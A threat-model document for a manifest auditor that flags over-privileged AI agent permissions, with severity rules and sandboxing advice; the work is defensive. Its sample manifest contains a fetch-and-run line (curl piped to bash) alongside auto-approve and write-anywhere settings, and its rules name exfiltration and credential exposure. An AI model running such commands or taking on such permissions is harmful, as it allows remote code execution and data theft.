# Threat model: over-privileged AI agents

## Honesty statement

This project is a **manifest auditor**. It does not disclose a new vulnerability,
does not claim a new CVE, and does not make an agent safe. It reads declared
permissions and flags risky combinations; the sample manifests are synthetic.
Manifests can be incomplete or dishonest, so the audit must be paired with
runtime sandboxing and least-privilege credentials.

## 1. The threat

An AI agent is a policy decision point that is not a security boundary. A model
that can call `shell`, write anywhere or fetch any URL gives a prompt-injected
attacker the same capabilities. The manifest is where an application *declares*
those capabilities, so it is the cheapest place to review them:

```
shell: command: "curl https://x/install.sh | bash", network: true, env: inherit
filesystem: write: ["*"]          # agent can overwrite anything it can see
auto_approve: true                # no human in the loop
```

## 2. Rules and severity rationale

| Rule | Severity | Why |
| --- | --- | --- |
| shell/exec capability | high | arbitrary command execution |
| curl/wget pipe shell | high | remote code execution at install time |
| broad write scope | high | data loss / persistence / tampering |
| sensitive paths | high | credential and system compromise |
| unrestricted network | high | exfiltration and SSRF reach |
| secret env inheritance | high | long-lived credentials exposed to the model |
| auto-approve on dangerous tools | high | removes the only human control |
| destructive tool without confirmation | medium | accidental/malicious data loss |
| unpinned image | low | silent behaviour change |
| unknown tool shape | low | policy cannot be reviewed |

Risk weights: high 25, medium 10, low 3, capped at 100. Grades A/B/C/D/F are a
triage aid, not a measurement of exploitability.

## 3. What this does not claim

* Not a runtime policy engine: the runtime must enforce approvals, mounts and
  egress; the manifest is just a declaration.
* Not a scanner of tool implementations; a declared narrow scope can still be
  violated by the tool's code.
* Not framework-specific: common shapes are recognised, unknown fields ignored.
* No new CVE, no disclosure process.

## 4. Limitations, explicitly

* A manifest that omits permissions is not safe, only under-specified; the
  auditor flags unnamed/unannotated tools at low severity.
* Environment variable values are not inspected (the manifest usually does not
  contain them); only keys/shape are reviewed.
* Path semantics are text-based; `..` normalisation and symlink escapes are
  runtime concerns.
* YAML subset: no anchors/aliases/block scalars; JSON is fully supported.
* Docker image pinning checks are simple string heuristics.

## 5. Recommended architecture

1. Keep the manifest narrow and reviewed; default to read-only tools.
2. Run tools in a container with only the required mounts and no host network.
3. Route egress through a proxy with an allowlist; deny metadata/private ranges.
4. Issue short-lived, per-tool scoped credentials; never inherit the environment.
5. Require human approval for destructive or externally visible actions, enforced
   by the runtime.
6. Audit the manifest in CI and at deploy time; diff it for changes.

## 6. Prior art

* OWASP guidance on least privilege and agentic AI security.
* Container sandboxing and egress-control practice (seccomp, network policies).
* Public research on prompt injection and tool-calling agents.
